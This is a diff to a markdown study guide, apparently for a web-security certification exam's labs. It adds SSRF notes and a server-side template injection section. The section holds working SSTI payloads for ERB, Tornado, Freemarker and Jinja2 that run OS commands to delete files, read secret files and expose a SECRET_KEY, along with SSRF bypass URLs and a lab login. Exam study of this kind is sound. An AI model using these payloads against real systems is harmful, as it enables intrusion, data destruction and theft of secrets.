@@ -869,9 +869,12 @@ Change the Connection header to keep-alive.
 Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.
 
 ## Server-side request forgery (SSRF)
+This can help you in stage 1 and stage 2 mostly.
+Most of the times burp automatically detects this with scanner, with findings saying like external resource access, out of band resource load and sometimes, there will be an open redirect vulnerability.
+
 ## Approach
 One of my favorites, quite easy to understand.  
-**ATTENTION:** If you find an SSRF vulnerability on exam, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.  
+**ATTENTION:** If you find an SSRF vulnerability on exam, you can use it to read the files by accessing an internal-only service running on localhost on port 6566.  
 
 In addition to lab cases, I've got some other useful techniques about this type:  
 SSRF Bypass:
@@ -924,6 +927,67 @@ stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/
 <iframe src='http://localhost:6566/secret' height='500' width='500'>
 ```
 >https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/  
+
+## Server Side Template Injection(SSTI)
+
+Look for error messages received when you click on items, etc, it may reveal that there is some template being used, targeted scanner is a good approach to find these vulnerabilities quickly.
+This may not be easily found by automated scanner.
+This maybe used for stage1 or 2, but primarily for stage3
+## Approach
+
+Look for a a parameter that is rendering directly to the page. Look for templates if you have admin access to edit the templates of a page
+
+    ERB: <%= %>
+    Tornado: ""}}{% import os %}{{os.system("rm /home/carlos/morale.txt")
+    Jinja2: Use {% debug %} to gather information, targeting setting.SECRET_KEY
+    See https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection for more information
+    Login with content-manager:C0nt3ntM4n4g3r.
+
+
+Complexity can only arise when searching for the language in which the code was written, for this I used a small tip to narrow the range of technologies: at the exploration stage, we iterate over template expressions ```({{7*7}}, ${7*7},<% = 7*7 %>, ${{7*7}}, #{7*7}, *{7*7})``` and if, for example, we got the expression ```<%= 7*7 %>``` go to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) and look for all technologies that use this expression. The method, of course, has a big crack in the form of the most common expression ```{{7*7}}```, here only God can tell you what kind of technology it is. Again, do not hesitate to scan with Burp, maybe it can tell you what technology is used.  
+
+Arises at View Details with reflected phrase **Unfortunately this product is out of stock**  
+![aa](https://user-images.githubusercontent.com/58632878/224709631-b1b0555f-5ee6-44a9-a98a-0244ebead621.png)  
+
+## Labs
+### 1. Basic server-side template injection
+>Ruby
+```
+<%= system("rm+morale.txt") %>
+```
+
+### 2. Basic server-side template injection (code context)
+```
+blog-post-author-display=user.first_name}}{%+import+os+%}{{os.system('rm+morale.txt')}}
+```
+
+### 3. Server-side template injection using documentation
+>Java Freemaker
+```
+${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
+```
+
+### 4. Server-side template injection in an unknown language with a documented exploit
+>NodeJS Handlebars exploit
+>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs
+
+
+### 5. Server-side template injection with information disclosure via user-supplied objects
+>Python Jinja2
+```
+{{settings.SECRET_KEY}}
+```
+
+
+### 6. Admin panel Password Reset Email SSTI
+>Jinja2  
+
+![image](https://user-images.githubusercontent.com/58632878/231809302-f33ab8c9-da30-4542-ad9f-7dbd9502c822.png)  
+```
+newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
+&csrf=csrf
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2
 
 
 **Get access to any user**  
